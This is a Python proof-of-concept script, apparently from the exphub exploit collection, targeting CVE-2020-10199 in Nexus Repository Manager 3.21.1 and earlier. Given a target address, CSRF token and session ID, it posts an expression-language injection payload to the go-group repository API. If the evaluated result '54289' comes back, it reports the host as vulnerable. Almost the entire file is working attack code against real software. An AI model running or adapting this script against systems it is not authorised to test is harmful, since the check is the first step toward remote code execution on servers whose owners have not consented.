#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:zhzyker
# from:https://github.com/zhzyker/exphub

import sys
import requests
import json

if len(sys.argv)!=5:
    print('+----------------------------------------------------------------------------------------------------------+')
    print('+ DES: by zhzyker as https://github.com/zhzyker/exphub                                                     +')
    print('+      CVE-2020-10199 need username & password                                                             +')
    print('+----------------------------------------------------------------------------------------------------------+')
    print('+ USE: python3 <filename> <ip> <port> <csrf> <sessionid>                                                   +')
    print('+ EXP: python3 cve-2020-10199_poc.py 1.1.1.1 8081 0.9567822851573897 edfca15e-c721-45e2-bdef-e8b3c6364ddb  +')
    print('+ VER: Nexus Repository Manager OSS/Pro version <= 3.21.1                                                  +')
    print('+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
ip = sys.argv[1]
port = sys.argv[2]
csrf = sys.argv[3]
sessionid = sys.argv[4]

url = "http://"+ip+":"+port

headers = {
    "Host": "%s:%s" % (ip, port),
    "Referer": url,
    "X-Nexus-UI": "true",
    "X-Requested-With": "XMLHttpRequest",
    "NX-ANTI-CSRF-TOKEN": csrf,
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/json",
    "Cookie": "NX-ANTI-CSRF-TOKEN=%s; NXSESSIONID=%s" % (csrf, sessionid),
    "Origin": url,
    "Connection": "close"
    }
    
vulurl=url+"/service/rest/beta/repositories/go/group"

payload = {"name": "internal", "online": "true", "storage": {"blobStoreName": "default", "strictContentTypeValidation": "true"}, "group": {"memberNames": ["$\\A{233*233}"]}}

r = requests.post(vulurl, data=json.dumps(payload), headers=headers)
print (r.text)
if "A54289" in r.text:
    print ("[+] CVE-2020-10199 vulnerability exists. exp as https://github.com/zhzyker/exphub")
else:
    print ("[-] CVE-2020-10199 vulnerability does not exist.")
